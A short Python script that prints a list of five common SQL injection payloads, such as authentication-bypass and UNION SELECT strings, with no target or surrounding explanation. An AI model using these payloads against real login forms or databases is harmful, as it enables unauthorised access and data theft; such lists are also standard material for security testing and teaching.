def generate_sql_payloads():
    base_payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, null --",
        "' AND '1'='1",
        "admin' --",
        "' OR '1'='1"
    ]
    for payload in base_payloads:
        print(f"Payload: {payload}")

generate_sql_payloads()
